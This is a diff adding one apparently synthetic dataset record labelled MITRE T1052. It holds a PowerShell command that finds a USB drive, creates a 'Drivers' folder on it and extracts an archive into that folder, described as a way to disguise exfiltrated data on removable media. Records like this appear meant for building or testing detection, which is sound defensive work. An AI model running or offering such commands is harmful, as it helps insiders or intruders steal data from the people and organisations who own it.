@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$dl=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable'} | Select-Object -First 1 -ExpandProperty DriveLetter); New-Item -Path \"$dl:\\Drivers\" -ItemType Directory -Force | Out-Null; Expand-Archive -Path \"C:\\ProgramData\\drivers_cache.zip\" -DestinationPath \"$dl:\\Drivers\" -Force",
+  "explanation": "Expands a cache ZIP into a drivers-themed directory on the USB to blend in while staging exfiltrated content on removable media.",
+  "rationale_steps": [
+    "Identify a removable drive letter.",
+    "Create a plausible directory on the USB.",
+    "Extract a local archive directly to the USB device."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-5d877001-ef5b4c5a",
+  "source_prompt_hash": "5d877001",
+  "timestamp_utc": "2025-09-30T05:25:30.107478Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
